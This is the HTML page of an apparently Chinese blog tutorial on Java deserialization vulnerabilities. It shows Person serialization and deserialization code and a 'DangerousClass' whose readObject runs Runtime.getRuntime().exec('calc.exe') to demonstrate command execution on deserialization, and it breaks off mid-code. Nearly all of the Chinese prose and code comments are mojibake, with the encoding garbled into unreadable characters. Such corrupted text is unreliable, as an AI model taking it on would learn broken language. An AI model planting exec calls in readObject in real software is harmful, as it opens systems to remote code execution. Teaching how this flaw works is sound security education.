<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Regulus"/><meta name="copyright" content="Regulus"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="JAVAååºåˆ—åŒ– | Meiçš„å°çª"/><meta name="apple-mobile-web-app-title" content="JAVAååºåˆ—åŒ– | Meiçš„å°çª"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/10/01/JAVAååºåˆ—åŒ–/"/><meta name="description" content="JAVAååºåˆ—åŒ–æ¼æ´ä¸çŸ¥é“è¦å¹²ä»€ä¹ˆï¼Œæ„Ÿè§‰JAVAååºåˆ—åŒ–è€ƒçš„æ¬¡æ•°å¥½å°‘å•Šï¼Œä½†æ˜¯é—²ç€æ²¡äº‹åšå•Šã€‚ç»ˆäºè¦åˆ°åŸºç¡€çŸ¥è¯†ä¸­æœ€éš¾çš„åœ°æ–¹äº†å—ï¼ŒJAVAååºåˆ—åŒ–ï¼Œç¨å¾®çœ‹äº†ä¸€ä¸‹æ„Ÿè§‰è¦å®Œè›‹äº† 1.JAVAåºåˆ—åŒ–æƒ³è¦äº†è§£ååºåˆ—åŒ–æ¼æ´å…ˆæ¥çœ‹ä¸‹å¦‚ä½•è¿›è¡Œåºåˆ—åŒ– Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼›è€ŒJavaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚ å’ŒPHPä¸€æ ·éƒ½æ˜¯ä¸ºäº†åœ¨ç½‘ç»œä¸­ä¼ é€’JAVAå¯¹è±¡ è€Œä¸€...">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVAååºåˆ—åŒ– | Meiçš„å°çª">
<meta property="og:url" content="http://example.com/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Meiçš„å°çª">
<meta property="og:description" content="JAVAååºåˆ—åŒ–æ¼æ´ä¸çŸ¥é“è¦å¹²ä»€ä¹ˆï¼Œæ„Ÿè§‰JAVAååºåˆ—åŒ–è€ƒçš„æ¬¡æ•°å¥½å°‘å•Šï¼Œä½†æ˜¯é—²ç€æ²¡äº‹åšå•Šã€‚ç»ˆäºè¦åˆ°åŸºç¡€çŸ¥è¯†ä¸­æœ€éš¾çš„åœ°æ–¹äº†å—ï¼ŒJAVAååºåˆ—åŒ–ï¼Œç¨å¾®çœ‹äº†ä¸€ä¸‹æ„Ÿè§‰è¦å®Œè›‹äº† 1.JAVAåºåˆ—åŒ–æƒ³è¦äº†è§£ååºåˆ—åŒ–æ¼æ´å…ˆæ¥çœ‹ä¸‹å¦‚ä½•è¿›è¡Œåºåˆ—åŒ– Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼›è€ŒJavaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚ å’ŒPHPä¸€æ ·éƒ½æ˜¯ä¸ºäº†åœ¨ç½‘ç»œä¸­ä¼ é€’JAVAå¯¹è±¡ è€Œä¸€...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/assets/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2025-10-01T13:23:45.000Z">
<meta property="article:modified_time" content="2025-10-20T11:51:20.162Z">
<meta property="article:author" content="Regulus">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>JAVAååºåˆ—åŒ– | Meiçš„å°çª</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="ä¸»é¡µ"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="ä¸»é¡µ"><div>Meiçš„å°çª</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>æ–‡ç« </span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>å½’æ¡£</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>åˆ†ç±»</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>æ ‡ç­¾</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>å…³äº</span></a></li></ul></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="æœç´¢" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>æœç´¢</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="æ‰“å¼€èœå•"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="ä¸»é¡µ"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="ä¸»é¡µ">Meiçš„å°çª</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>æ–‡ç« </span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>å½’æ¡£</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>åˆ†ç±»</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>æ ‡ç­¾</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>å…³äº</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">ã€Œ Meiçš„å°çª ã€</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">JAVAååºåˆ—åŒ–</h1><div class="post-author"><span>ä½œè€…: Regulus</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>å‘è¡¨äº2025-10-01</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>æ›´æ–°äº2025-10-20</span></div></div><div class="post-read"><div class="post-wordcount"><img src="/assets/images/svg/ta/ta-write.svg" class="icon noview" alt="Icon"><span>æ€»å­—æ•°: 6.4kå­—</span></div><div class="post-readtime"><img src="/assets/images/svg/ta/ta-time.svg" class="icon noview" alt="Icon"><span>é˜…è¯»æ—¶é•¿: 22åˆ†é’Ÿ</span></div><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>è®¿é—®é‡: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"></div></div><div class="post markdown" indent="false"><h1 id="JAVAååºåˆ—åŒ–æ¼æ´"><a href="#JAVAååºåˆ—åŒ–æ¼æ´" class="headerlink" title="JAVAååºåˆ—åŒ–æ¼æ´"></a>JAVAååºåˆ—åŒ–æ¼æ´</h1><p>ä¸çŸ¥é“è¦å¹²ä»€ä¹ˆï¼Œæ„Ÿè§‰JAVAååºåˆ—åŒ–è€ƒçš„æ¬¡æ•°å¥½å°‘å•Šï¼Œä½†æ˜¯é—²ç€æ²¡äº‹åšå•Šã€‚ç»ˆäºè¦åˆ°åŸºç¡€çŸ¥è¯†ä¸­æœ€éš¾çš„åœ°æ–¹äº†å—ï¼ŒJAVAååºåˆ—åŒ–ï¼Œç¨å¾®çœ‹äº†ä¸€ä¸‹æ„Ÿè§‰è¦å®Œè›‹äº†</p>
<h2 id="1-JAVAåºåˆ—åŒ–"><a href="#1-JAVAåºåˆ—åŒ–" class="headerlink" title="1.JAVAåºåˆ—åŒ–"></a>1.JAVAåºåˆ—åŒ–</h2><p>æƒ³è¦äº†è§£ååºåˆ—åŒ–æ¼æ´å…ˆæ¥çœ‹ä¸‹å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–</p>
<p><strong>Javaåºåˆ—åŒ–</strong>æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼›è€Œ<strong>Javaååºåˆ—åŒ–</strong>æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚</p>
<p>å’ŒPHPä¸€æ ·éƒ½æ˜¯ä¸ºäº†åœ¨ç½‘ç»œä¸­ä¼ é€’JAVAå¯¹è±¡</p>
<p>è€Œä¸€èˆ¬å®ç°çš„æ–¹æ³•å°±æ˜¯ <strong>serializeå’Œunserialize</strong>ã€‚ï¼ˆåªæœ‰å®ç°äº†Serializableæˆ–è€…Externalizableæ¥å£çš„ç±»çš„<strong>å¯¹è±¡</strong>æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—ã€‚ï¼‰</p>
<p>ç„¶åJavaååºåˆ—åŒ–çš„æµç¨‹å°±æ˜¯æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå®ç°Serializableçš„ç±»ã€‚ç„¶åé€šè¿‡ObjectOutputStreamï¼Œå°†å¯¹è±¡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå†é€šè¿‡ObjectInputStreamï¼Œè¯»å‡ºè¿™ä¸ªæ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–</p>
<p>å…ˆå†™ä¸€ä¸ªéœ€è¦åºåˆ—åŒ–çš„ç±»</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  <span class="comment">//å®ç°Serializableæ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  <span class="comment">//é‡å†™toStringæ–¹æ³•ç”¨äºè¾“å‡ºå±æ€§</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name +<span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åå†å°†å…¶å†™å…¥æ–‡ä»¶ä¸­</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;xx.bin&quot;</span>)); <span class="comment">//ç”±äºjavaä¸åƒphpå¯ä»¥ç›´æ¥ä½¿ç”¨serializeï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±å†™ä¸€ä¸ªï¼Œå®é™…ä¸Šçš„åºåˆ—åŒ–æ˜¯ç”±ObjectOutputStream.writeObjectå®ç°çš„</span></span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">12</span>,<span class="string">&quot;dd&quot;</span>);</span><br><span class="line">        serialize(person);<span class="comment">//ä¸»ç¨‹åºè¿›è¡Œå‡½æ•°è°ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿˜æœ‰å°±æ˜¯æˆ‘éƒ½å¿«å¿˜äº†Javaçš„åŒ…çš„æœºåˆ¶äº†ï¼Œå°±æ˜¯åœ¨åŒåŒ…çš„åŸºç¡€ä¸Šæ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œå˜é‡è®¿é—®çš„ï¼Œä¸åŒåŒ…æ—¶åˆ™éœ€è¦é€šè¿‡importè¿›è¡Œå¼•å…¥åŒ…ï¼Œæƒ³äº†åŠå¤©ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥newå‡ºå¯¹è±¡æ¥</p>
<p>ç„¶åå°±æ˜¯è¯»å–æ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–äº†</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span><span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));<span class="comment">//å…ˆé€šè¿‡new FileInputStream(Filename)æ‰“å¼€æ–‡ä»¶è¯»å–æµç„¶åå†é€šè¿‡ObjectInputStreamè¯»å–åºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();<span class="comment">//è¿›è¡Œååºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>äºæ˜¯æˆ‘ä»¬ååºåˆ—åŒ–çš„æµç¨‹åŸºæœ¬å°±å®Œæˆäº†ï¼Œå¦‚æœæ˜¯ä»è¯·æ±‚å¤´ä¸­è¯»å–åºåˆ—åŒ–æ•°æ®åªéœ€è¦<code>getInputStream</code>å¼€å¯è¾“å…¥æµå³å¯</p>
<h2 id="2-æ¼æ´äº§ç”ŸåŸå› "><a href="#2-æ¼æ´äº§ç”ŸåŸå› " class="headerlink" title="2.æ¼æ´äº§ç”ŸåŸå› "></a>2.æ¼æ´äº§ç”ŸåŸå› </h2><p>ä¹‹å‰å­¦è¿‡PHPååºåˆ—åŒ–æ¼æ´ä¾èµ–ä»£ç ï¼Œå¦‚æœæ²¡æœ‰åˆé€‚çš„é­”æœ¯æ–¹æ³•å’Œå‡½æ•°ç­‰ï¼Œå³ä½¿ä¸è¿›è¡Œä»»ä½•è¿‡æ»¤ä¹Ÿæ˜¯æ²¡æœ‰åŠæ³•çš„</p>
<p>JAVAååºåˆ—åŒ–åˆ™è¿é­”æœ¯æ–¹æ³•ä¹Ÿæ²¡æœ‰ï¼Œç†è§£javaååºåˆ—åŒ–æ¼æ´è¿˜æ˜¯èŠ±äº†ä¸€ç‚¹æ—¶é—´çš„</p>
<p>æˆ‘ä»¬çŸ¥é“Javaä¸­çš„ç±»æ˜¯ä»¥å›¾çš„å½¢å¼å­˜åœ¨çš„ï¼Œé¦–å…ˆç†è§£<strong>å¯¹è±¡å›¾</strong> - æŒ‡çš„æ˜¯ä¸€ä¸ªå¯¹è±¡åŠå…¶æ‰€æœ‰å…³è”å¯¹è±¡ç»„æˆçš„ç½‘ç»œ</p>
<p>ç„¶ååœ¨è¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šå°†æ•´ä¸ªå›¾è¿›è¡Œåºåˆ—åŒ–ï¼Œååºåˆ—åŒ–æ—¶ç›¸åº”çš„ä¹Ÿä¼šå°†æ•´ä¸ªå›¾è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™ç‚¹æœ‰ä¸€ç‚¹ç±»ä¼¼PHPååºåˆ—åŒ–æ—¶ä¼šå°†popé“¾ä¸Šçš„æ‰€æœ‰å¯¹è±¡å…¨éƒ¨è¿›è¡Œååºåˆ—åŒ–</p>
<p>åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè§¦å‘æ¯ä¸ªååºåˆ—åŒ–ç±»çš„readObjectæ–¹æ³•ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–çš„åŒæ—¶å¯ä»¥é€šè¿‡é‡å†™readObjectæ–¹æ³•å®ç°è‡ªå®šä¹‰æ“ä½œï¼Œæœ‰ç‚¹ç±»ä¼¼PHPçš„<code>__wakeup</code>é­”æœ¯æ–¹æ³•çš„æœºåˆ¶ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DangerousClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String data;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ğŸš¨ ååºåˆ—åŒ–æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject(); <span class="comment">// å…ˆæ‰§è¡Œé»˜è®¤ååºåˆ—åŒ–</span></span><br><span class="line">        System.out.println(<span class="string">&quot;readObject() è¢«è‡ªåŠ¨è°ƒç”¨äº†ï¼&quot;</span>);</span><br><span class="line">        <span class="comment">// æ”»å‡»è€…å¯ä»¥åœ¨è¿™é‡Œæ’å…¥æ¶æ„ä»£ç </span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä½†æ˜¯è¿™ä¸ªè‡ªå®šä¹‰çš„readObjectå’Œæˆ‘ä»¬ç›´æ¥<code>Object obj = ois.readObject();</code>ååºåˆ—åŒ–çš„èµ·å§‹æ“ä½œæ˜¯ä¸åŒçš„ï¼Œå…·ä½“æµç¨‹ä¸º</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ä½ çš„ä»£ç è°ƒç”¨ ois.readObject()</span><br><span class="line">    â†“</span><br><span class="line">JVMå¼€å§‹æ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹</span><br><span class="line">    â†“</span><br><span class="line">å‘ç°å¯¹è±¡æœ‰è‡ªå®šä¹‰readObject()æ–¹æ³•</span><br><span class="line">    â†“</span><br><span class="line">JVMè‡ªåŠ¨è°ƒç”¨ ä½ çš„è‡ªå®šä¹‰readObject()</span><br><span class="line">    â†“</span><br><span class="line">åœ¨ä½ çš„æ–¹æ³•ä¸­è°ƒç”¨ ois.defaultReadObject()   <span class="comment">//è¿™ä¸ªé»˜è®¤ååºåŒ–å¯èƒ½æ˜¯ä¸ºäº†ä¸ºä¸€äº›å±æ€§èµ‹å€¼é»˜è®¤å€¼</span></span><br><span class="line">    â†“</span><br><span 